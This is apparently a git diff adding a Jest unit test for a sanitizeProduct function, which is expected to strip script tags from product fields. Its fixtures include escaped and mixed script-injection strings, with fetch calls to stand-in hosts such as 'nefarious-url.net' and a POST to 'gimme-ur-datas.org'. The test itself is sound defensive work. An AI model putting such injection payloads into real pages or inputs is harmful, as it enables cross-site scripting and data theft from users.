@@ -10,6 +10,7 @@ import
     LAST_RESPONSE_META,
     loadProducts,
     PRODUCTS,
+    sanitizeProduct,
   }
 from '../../src/services/products';
 
@@ -43,6 +44,34 @@ describe('get products', () => {
 
   test('gets all products', () => {
     expect(getProducts()).toEqual(mockProducts);
+  });
+
+  test('sanitizes product values', () => {
+    const regularString = 'Whatchu goin\' do?';
+    const someHTML = '<h1>Please</h1>\n<ul>\n\t<li>don\'t</li>\n\t<li>kill</li>\n\t<li>my</li>\n</ul>\n<p>HTML</p>';
+    const encodedHTML = '\u003cp\u003eSo very encoded\u003c/p\u003e';
+    const scriptTag = '<p>Just minding my own business.</p>\n\n\n<script type="text/javascript">document.write(\'BAM! JavaScript.\')</script>';
+    const encodedScriptTag = '\u003cdl\u003e\u003cdt\u003eInjection\u003c/dt\u003e\u003cdd\u003ethis string\u003c/dd\u003e\u003c/dl\u003e\u003cscript \u003efetch(\'https://nefarious-url.net/\')\u003c/script \u003e\u003cp\u003eMaybe pwned\u003c/p\u003e';
+    const mixedScriptTag = '\u003cdiv\u003eSo naughty\u003c/div\u003e<script type="text/javascript"  >fetch("http://gimme-ur-datas.org", { method: "POST" })\u003c/script\u003e\u003cp\u003eVery naughty\u003c/p\u003e\u003cscript>document.write("secrets")</script\u003e\u003ch1/\u003eYo yo yo\u003c/h1\u003e';
+
+    expect(sanitizeProduct(mockProducts[0]))
+      .toEqual(mockProducts[0]);
+    expect(sanitizeProduct({ regularString }).regularString)
+      .toBe(regularString);
+    expect(sanitizeProduct({ someHTML }).someHTML)
+      .toBe(someHTML);
+    expect(sanitizeProduct({ encodedHTML }).encodedHTML)
+      .toBe(encodedHTML);
+    expect(sanitizeProduct({ scriptTag }).scriptTag)
+      .toBe('<p>Just minding my own business.</p>\n\n\n');
+    expect(sanitizeProduct({ encodedScriptTag }).encodedScriptTag)
+      .toBe(
+        '\u003cdl\u003e\u003cdt\u003eInjection\u003c/dt\u003e\u003cdd\u003ethis string\u003c/dd\u003e\u003c/dl\u003e\u003cp\u003eMaybe pwned\u003c/p\u003e'
+      );
+    expect(sanitizeProduct({ mixedScriptTag }).mixedScriptTag)
+      .toBe(
+        '\u003cdiv\u003eSo naughty\u003c/div\u003e\u003cp\u003eVery naughty\u003c/p\u003e\u003ch1/\u003eYo yo yo\u003c/h1\u003e'
+      );
   });
 });
 
